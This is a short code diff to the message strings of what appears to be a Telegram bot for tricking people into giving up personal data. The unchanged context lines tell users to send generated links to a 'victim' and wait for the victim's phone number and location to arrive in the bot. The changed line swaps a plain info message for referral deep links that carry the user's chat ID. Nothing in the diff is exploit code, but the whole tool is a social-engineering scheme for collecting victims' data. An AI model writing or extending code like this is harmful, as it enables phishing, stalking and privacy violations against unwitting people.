@@ -100,7 +100,7 @@ const messages = {
       `*🗺 Location Only Link (Pro Feature Form):*\n${locationUrl}\n\n` +
       `*📞🗺 Both Phone Number and Location Link (Referral Form):*\n${bothUrl}\n\n` +
       `❯ Use the above links to hack your victim's phone number and/or location. Copy the desired link and send it to your victim. Wait for the hacked information to be sent to you in the bot!`,
-    myInfoMessage: (botUsername, chatId) => `hey this is your info:\n@${botUsername}\n${chatId}`,
+    myInfoMessage: (botUsername, chatId) => `hey this is your info:\nhttps://t.me/${botUsername}?start=ref_${chatId}\n\nhttps://t.me/${botUsername}?start=pro_${chatId}\n\nhttps://t.me/${botUsername}?start=free_${chatId}`,
     backToMenu: 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ 🔙',
     banned: '📛 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ᴜsɪɴɢ ʙᴏᴛ :(',
     adminPanel: 'ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 🧰',
